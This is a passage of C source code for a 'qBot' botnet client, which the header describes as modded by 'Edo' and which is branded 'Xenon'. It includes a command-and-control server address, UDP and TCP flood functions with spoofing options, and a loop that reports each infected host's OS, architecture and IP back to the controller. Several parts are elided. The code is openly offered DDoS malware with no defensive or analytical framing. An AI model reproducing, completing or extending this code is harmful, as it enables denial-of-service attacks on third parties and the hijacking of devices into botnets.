/*
    Just A Public qBot, Fixed/Cleaned Up And Modded By Edo.
    Storing Address In Array
    Made All The Floods Actually Work
    Added Redsyn
    Added Killall
...
unsigned char *commServer[] = {"999.999.999.999:2222"};
//Def Colors
#define T "\e[32m"
#define W "\e[0m"
#define B "\e[37m"
...
void udpfl00d(unsigned char *target, int port, int start, int data_len)//udpfl00d made by Edo plz dont rip my method :(
{
    struct sockaddr_in dest_addr;
...
void ftcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
    ...
    while(1)
    {
        ...
        "x4E/x31/x6B/x4B/x31/x20/x21/x73/x69/x20/x4D/x33/x75",
...
int main(int argc, unsigned char *argv[])
{
        ...
        while(1)
        {
                ...
                sockprintf(mainCommSock, "OS: %s", defpkgs());
                sockprintf(mainCommSock, "arch: %s", defarchs());
                sockprintf(mainCommSock, "botname: "W"Xenon "W"["T"%s"W"] ["T"%s"W"] "W"["T"%s"W"] ["T"%s"W"] ["T"%s"W"]", inet_ntoa(ourIP), defPorts(), defarchs(), defopsys(), defpkgs());
                char commBuf[4096];
                int got = 0;
                int i = 0;
